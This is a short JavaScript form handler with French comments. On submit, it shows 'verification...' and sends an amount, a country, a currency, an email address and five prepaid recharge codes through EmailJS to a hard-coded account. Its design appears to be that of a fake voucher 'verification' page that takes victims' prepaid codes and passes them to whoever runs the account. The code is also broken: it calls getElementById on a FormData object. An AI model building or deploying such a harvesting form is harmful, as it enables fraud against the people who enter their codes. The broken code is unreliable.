
const btn = document.getElementById('button');

document.getElementById("myForm").addEventListener("submit", function(event){
    event.preventDefault(); //empecher le comportement par défaut du formulaire

    btn.value = 'verification...';

    const formData = new FormData(event.target); //recupère les données du formulaire

    const data = {
        service_id: 'service_hyjlokh', // Remplacez par votre ID de service EmailJS
        template_id: 'template_tqx1gd5', // Remplacez par votre ID de template EmailJS
        user_id: '6nWzFALFu0qk_jKjN', // Remplacez par votre ID d'utilisateur EmailJS
        template_params: {
            recharge: formData.get('recharge'),
            montant: formData.get('montant'),
            pays: formData.getElementById('pays'),
            devise: formData.get('devise'),
            recharge1: formData.get('codeRecharge1'),
            recharge2: formData.get('codeRecharge2'),
            recharge3: formData.get('codeRecharge3'),
            recharge4: formData.get('codeRecharge4'),
            recharge5: formData.get('codeRecharge5'),
            email: formData.get('email')
        }
    };

    fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert("Formulaire envoyé avec succès !");
        } else {
            alert("Erreur lors de l'envoi du formulaire.");
        }
    })
    .catch(error => {
        alert("Une erreur est survenue : " + error);
    });


    console.log(data);
});